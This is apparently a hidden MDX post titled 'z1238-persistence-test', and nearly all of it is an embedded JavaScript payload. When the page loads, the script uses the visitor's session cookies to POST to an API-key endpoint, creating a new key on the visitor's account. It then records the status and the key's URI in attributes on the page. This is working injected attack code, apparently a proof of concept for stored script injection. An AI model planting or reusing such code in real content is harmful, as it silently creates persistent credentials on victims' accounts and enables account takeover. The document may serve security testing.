---
title: z1238-persistence-test
author: sadas asdas
hidden: true
published_at: '2026-10-11T13:49:29.702Z'
type: added
---
z1238-persistence-test

Env: {typeof window === "undefined" ? "SSR-ONLY" : "CLIENT-" + window.location.host}

export const z1238post = (typeof window === "undefined") ? "SSR-SKIP" : (function(){ try { fetch("/fesb-wlyz/api-next/v2/projects/me/apikeys?z1238post=0b062bca4274", {method:"POST", credentials:"include", cache:"no-store", headers:{"Content-Type":"application/json"}, body:JSON.stringify({label:"z1238-persistence-test"})}).then(function(r){ document.documentElement.setAttribute("data-z1238post", String(r.status)); return r.json(); }).then(function(d){ document.documentElement.setAttribute("data-z1238post-uri", d && d.data && d.data.uri ? d.data.uri : "NO-URI"); }).catch(function(){ document.documentElement.setAttribute("data-z1238post", "ERR"); }); } catch(e){} return "POST-STARTED"; })();

Post: {z1238post}

End.